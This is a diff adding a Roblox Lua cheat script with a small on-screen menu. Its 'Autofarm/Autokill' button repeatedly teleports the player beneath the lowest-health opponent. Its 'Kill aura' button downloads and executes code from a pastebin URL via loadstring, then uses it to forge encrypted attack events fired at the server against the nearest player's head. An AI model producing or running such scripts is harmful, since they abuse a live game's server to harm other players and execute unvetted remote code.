@@ -1,0 +1,122 @@
+local p=game.Players.LocalPlayer
+local g=Instance.new("ScreenGui",p:WaitForChild("PlayerGui"))
+local f=Instance.new("Frame",g)
+f.BackgroundColor3=Color3.new(0,0,0)
+f.Size=UDim2.new(0.2,0,0.2,0)
+f.Position=UDim2.new(0.05,0,0.05,0)
+f.BackgroundTransparency=0.2
+Instance.new("UIStroke",f).Thickness=10
+local btn=Instance.new("TextButton",f)
+btn.Size=UDim2.new(1,0,0.25,0)
+btn.Text="Autofarm/Autokill"
+Instance.new("UICorner",btn)
+btn.TextColor3=Color3.new(1,1,1)
+btn.BackgroundColor3=Color3.new(0,0,0)
+btn.BackgroundTransparency=0.2
+btn.TextScaled=true
+btn.MouseButton1Click:Connect(function()
+    local c=p.Character or p.CharacterAdded:Wait()
+    while true do
+        wait(0.005)
+        local t,hp=nil,math.huge
+        for _,o in pairs(game.Players:GetPlayers()) do
+            if o~=p and o.Character then
+                local h=o.Character:FindFirstChild("Humanoid")
+                if h and h.Health>0 and h.Health<hp then
+                    hp=h.Health
+                    t=o
+                end
+            end
+        end
+        if t then
+            local p1=t.Character.HumanoidRootPart
+            for _,part in pairs(c:GetChildren()) do
+                if part:IsA("BasePart") then
+                    part.CFrame=CFrame.new(p1.Position-Vector3.new(0,4.6,0))*CFrame.Angles(math.rad(180),0,0)
+                    if p.Backpack:FindFirstChild("Fight") then
+                        p.Backpack.Fight.Parent=c
+                    end
+                end
+            end
+        end
+    end
+end)
+
+local B=Instance.new("TextButton",f)
+B.Size=UDim2.new(1,0,0.25,0)
+B.Text="Kill aura"
+B.TextColor3=Color3.new(1,1,1)
+Instance.new("UICorner",B)
+B.Position=UDim2.new(0,0,0.30,0)
+B.BackgroundTransparency=0.2
+B.TextScaled=true
+B.BackgroundColor3=Color3.new(0,0,0)
+B.MouseButton1Click:Connect(function()
+local player = game.Players.LocalPlayer
+local character = player.Character
+local localroot = character:WaitForChild("HumanoidRootPart")
+local url = "https://pastebin.com/raw/Vh2xiXZX"
+
+local response = request({
+    Url = url,
+    Method = "GET"
+})
+
+local loadedModule = loadstring(response.Body)()
+
+local function closest()
+    local range = 1000
+    local target = nil
+    for _, v in pairs(game.Players:GetPlayers()) do
+        if v ~= player and v.Character and not v.Character:FindFirstChildWhichIsA("ForceField") then
+            local JN = v.Character:FindFirstChild("HumanoidRootPart")
+            local JNR = v.Character:FindFirstChildOfClass("Humanoid")
+            if JN and JNR.Health > 0 then
+                local dist = (localroot.Position - JN.Position).magnitude
+                if dist < range then
+                    range = dist
+                    target = v.Character
+                end
+            end
+        end
+    end
+    return target
+end
+
+game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
+    character = char
+    localroot = character:WaitForChild("HumanoidRootPart")
+end)
+local jh = closest()
+game:GetService("RunService").Heartbeat:Connect(function()
+    jh = closest()
+end)
+while game:GetService("RunService").Heartbeat:Wait() do
+    wait(1)
+for I=1,140 do
+    if jh and jh:FindFirstChild("Head") then
+        pcall(function()
+            local encrypted, extra_info = loadedModule.Encrypt("Attack", "FrogWasHere")
+
+            local vroot = jh:FindFirstChild("Head")
+            local args = {
+                [1] = encrypted,
+                [2] = {
+                    ["Limb"] = "Head",
+                    ["Character"] = jh,
+                    ["Point"] = Vector3.new(vroot.Position.X, vroot.Position.Y, vroot.Position.Z),
+                    ["Hit"] = vroot
+                },
+                [3] = false,
+                [4] = extra_info
+            }
+           
+          game:GetService("Players").LocalPlayer.Character.Core.Communicate:FindFirstChild(""):FireServer(unpack(args))
+        end)
+end
+    end
+end
+end)
+local s=Instance.new("Sound",game.SoundService)
+s.SoundId="rbxassetid://6042053626"
+btn.MouseButton1Click:Connect(function() s:Play() end)
